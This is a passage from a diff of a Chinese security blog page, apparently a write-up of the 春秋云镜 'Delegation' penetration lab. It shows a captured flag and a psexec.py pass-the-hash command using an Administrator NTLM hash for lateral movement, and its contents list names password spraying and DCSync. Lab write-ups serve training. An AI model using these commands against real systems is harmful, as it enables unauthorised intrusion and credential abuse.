.+&#x27;</span>|=|`+. .+<span class="string">&#x27;|      .+&#x27;</span>|=|`+. .+<span class="string">&#x27;|=|`+. .+&#x27;</span>|=|`+. .+<span class="string">&#x27;|=|`+.=|`+. |`+. .+&#x27;</span>|=|`+. .+<span class="string">&#x27;|=|`+. </span></span><br><span class="line"><span class="string">|  | `+ | |  | `+.| |  |      |  | `+.| |  | `+.| |  | |  | |.+&#x27;</span> |  | `+.| |  | |  | |  | |  | `+ | </span><br><span class="line">|  |  | | |  |=|`.  |  |      |  |=|`.  |  | .    |  |=|  |      |  |      |  | |  | |  | |  |  | | </span><br><span class="line">|  |  | | |  | `.|  |  |      |  | `.|  |  | |`+. |  | |  |      |  |      |  | |  | |  | |  |  | | </span><br><span class="line">|  |  | | |  |    . |  |    . |  |    . |  | `. | |  | |  |      |  |      |  | |  | |  | |  |  | | </span><br><span class="line">|  | .+ | |  | .+<span class="string">&#x27;| |  | .+&#x27;</span>| |  | .+<span class="string">&#x27;| |  | .+ | |  | |  |      |  |      |  | |  | |  | |  |  | | </span></span><br><span class="line"><span class="string">`+.|=|.+&#x27;</span> `+.|=|.+<span class="string">&#x27; `+.|=|.+&#x27;</span> `+.|=|.+<span class="string">&#x27; `+.|=|.+&#x27;</span> `+.| |..|      |.+<span class="string">&#x27;      |.+&#x27;</span> `+.|=|.+<span class="string">&#x27; `+.|  |.| </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag03: flag&#123;36ca1e48-792d-42a1-9fdb-2c523046cc78&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here is fileserver.xiaorang.lab, you might find something interesting on this host that can help you!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取flag04(同上)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.py Administrator@172.22.4.7  -hashes 00000000000000000000000000000000:4889f6553239ace1f7c47fa2c619c252 -codec gbk</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/28.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://Hundredsu.github.io">Hundredsu</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://hundredsu.github.io/post/bdc052b9.html">https://hundredsu.github.io/post/bdc052b9.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://Hundredsu.github.io" target="_blank">Hundredsu'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/">靶机渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/post/6d98188.html" title="春秋云镜-certify"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">春秋云镜-certify</div></div><div class="info-2"><div class="info-item-1">https://blog.csdn.net/cyy001128/article/details/145285068 39.99.148.57 12345678910111213141516171819202122D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\未免杀5号黯区红队开发的fscan图形化和plus&gt;fscan.exe -h 39.99.148.57  ______                   _____  _ |  ____|                 |  __ \| | | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __| | |  \__ \ (_| (_| | | | | |    | | |_| \__ \ |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/                     fscan version: 1.8.4...</div></div></div></a><a class="pagination-related" href="/post/a3698f4a.html" title="春秋云镜-Delivery"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">春秋云镜-Delivery</div></div><div class="info-2"><div class="info-item-1">参考 还有n位师傅，就不详细记录了 https://mp.weixin.qq.com/s/jxGGwTu1TBJiH5LOVRO6pQ https://cloud.tencent.com/developer/article/1839233 https://bowuchuling.github.io/posts/chunqiu_Delivery.html 信息收集开局一个ip fscan开扫 39.99.248.209 1234567891011121314151617181920212223242526D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.99.248.209   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|  ...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/post/633b4305.html" title="春秋云镜–Aoselu"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜–Aoselu</div></div><div class="info-2"><div class="info-item-1">春秋云镜–Aoselu39.98.116.223 赛后复盘重打 写的不好，且比较乱，师傅自行判断借鉴 参考了官方的wp和一些其他的师傅的类型的打法wp 12345678910111213141516171819202122D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.98.116.223   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 2.0.0[*] 扫描类型: all, 目标端口:...</div></div></div></a><a class="pagination-related" href="/post/bf3976cc.html" title="cyberstrikelab-lab9"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">cyberstrikelab-lab9</div></div><div class="info-2"><div class="info-item-1">信息收集开局一个ip 172.5.33.6 fscan扫一下 12345678910111213141516171819202122232425262728293031D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 172.5.33.6┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     ││ \____/     |___/\___|_|  \__,_|\___|_|\_\    │└──────────────────────────────────────────────┘     ...</div></div></div></a><a class="pagination-related" href="/post/662902bc.html" title="reddish"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">reddish</div></div><div class="info-2"><div class="info-item-1">看佬c1trus说是很难的靶机，但是能学东西，正好最近在学docker逃逸，打一打  信息收集10.10.10.94 tscan扫端口  只开放了一个端口1880 Mongo-Express Node.js 外围打点node-red-rce访问显示这个  那么我们post看一下  12345&#123;  &quot;id&quot;: &quot;ffec0b75777a00bc6e65ff2660896ad1&quot;,  &quot;ip&quot;: &quot;::ffff:10.10.16.38&quot;,  &quot;path&quot;:...</div></div></div></a><a class="pagination-related" href="/post/38a9b672.html" title="春秋云镜-Brute4road"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Brute4road</div></div><div class="info-2"><div class="info-item-1">目标ip 信息收集 1fscan.exe -h 39.99.232.242   123456789101112131415161718192021  ______                   _____  _ |  ____|                 |  __ \| | | |__ ___  ___ __ _ _ __ | |__) | |_   _ ___ |  __/ __|/ __/ _  |  _ \|  ___/| | | | / __| | |  \__ \ (_| (_| | | | | |    | | |_| \__ \ |_|  |___/\___\__,_|_| |_|_|    |_|\__,_|___/                     fscan version: 1.8.4 TeamdArk5 v1.0start infoscan39.99.232.242:6379 open39.99.232.242:21 open39.99.232.242:22 open39.99.232.242:80 open[*] alive...</div></div></div></a><a class="pagination-related" href="/post/47d3d323.html" title="春秋云镜-Exchange"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Exchange</div></div><div class="info-2"><div class="info-item-1">参考wp： https://www.cnblogs.com/kingbridge/articles/16720318.html https://zer0peach.github.io/2024/12/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Exchange-writeup/ 开局一个ip39.99.153.253 fscan开扫 123456789101112131415161718192021222324D:\red\内网\免杀工具包\免杀工具包\fscan2.0.1&gt;fscan.exe -h 39.99.153.253┌──────────────────────────────────────────────┐│    ___                              _        ││   / _ \     ___  ___ _ __ __ _  ___| | __    ││  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    ││ /...</div></div></div></a><a class="pagination-related" href="/post/a3698f4a.html" title="春秋云镜-Delivery"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-07</div><div class="info-item-2">春秋云镜-Delivery</div></div><div class="info-2"><div class="info-item-1">参考 还有n位师傅，就不详细记录了 https://mp.weixin.qq.com/s/jxGGwTu1TBJiH5LOVRO6pQ https://cloud.tencent.com/developer/article/1839233 https://bowuchuling.github.io/posts/chunqiu_Delivery.html 信息收集开局一个ip fscan开扫 39.99.248.209 1234567891011121314151617181920212223242526D:\red\内网\免杀工具包\免杀工具包\fscan火绒6.0免杀版\fscan2.0&gt;fscan.exe -h 39.99.248.209   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|  ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Hundredsu</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Hundredsu"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/Hundredsu" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">这是Hundredsu的博客,随缘更新</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#flag01"><span class="toc-number">1.</span> <span class="toc-text">flag01</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.1.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag02%E2%80%93RDP%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92"><span class="toc-number">2.</span> <span class="toc-text">flag02–RDP爆破密码喷洒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">2.1.</span> <span class="toc-text">提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag03%E3%80%8104%E2%80%94%E2%80%94%E9%9D%9E%E7%BA%A6%E6%9D%9F%E6%80%A7%E5%A7%94%E6%B4%BE"><span class="toc-number">3.</span> <span class="toc-text">flag03、04——非约束性委派</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DCsync%E6%94%BB%E5%87%BB%E2%80%93%E8%8E%B7%E5%8F%96hash%E6%A8%AA%E5%90%91"><span class="toc-number">3.1.</span> <span class="toc-text">DCsync攻击–获取hash横向</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/b6e82410.html" title="5、并发编程">5、并发编程</a><time datetime="2025-08-07T13:57:12.000Z" title="发表于 2025-08-07 21:57:12">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/5715da98.html" title="4、函数&amp;字符串格式化&amp;条件控制&amp;结构体">4、函数&amp;字符串格式化&amp;条件控制&amp;结构体</a><time datetime="2025-08-07T13:57:10.000Z" title="发表于 2025-08-07 21:57:10">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/8b3c7b5f.html" title="3、数组与切片、指针、类型转换、字符串常用函数">3、数组与切片、指针、类型转换、字符串常用函数</a><time datetime="2025-08-07T13:57:09.000Z" title="发表于 2025-08-07 21:57:09">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/3beb5b8d.html" title="2、初始函数与基本类型">2、初始函数与基本类型</a><time datetime="2025-08-07T13:57:08.000Z" title="发表于 2025-08-07 21:57:08">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/347fb1ae.html" title="1、环境配置和编辑器使用">1、环境配置和编辑器使用</a><time datetime="2025-08-07T13:57:07.000Z" title="发表于 2025-08-07 21:57:07">2025-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2020 - 2025 By Hundredsu</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
+  const runMermaid = ele => {
+    window.loadMermaid = true
+    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'
+
+    ele.forEach((item, index) => {
+      const mermaidSrc = item.firstElementChild
+      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
+      const mermaidID = `mermaid-${index}`
+      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent
+
+      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
+      const renderMermaid = svg => {
+        mermaidSrc.insertAdjacentHTML('afterend', svg)
+      }
+
+      // mermaid v9 and v10 compatibility
+      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
+    })
+  }
+
+  const codeToMermaid = () => {
+    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
+    if (codeMermaidEle.length === 0) return
+
+    codeMermaidEle.forEach(ele => {
+      const preEle = document.createElement('pre')
+      preEle.className = 'mermaid-src'
+      preEle.hidden = true
+      preEle.textContent = ele.textContent
+      const newEle = document.createElement('div')
+      newEle.className = 'mermaid-wrap'
+      newEle.appendChild(preEle)
+      ele.parentNode.replaceWith(newEle)
+    })
+  }
+
+  const loadMermaid = () => {
+    if (false) codeToMermaid()
+    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
+    if ($mermaid.length === 0) return
+
+    const runMermaidFn = () => runMermaid($mermaid)
+    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
+    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
+  }
+
+  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
+  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
+})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.3.4"></script></div></div></body></html>
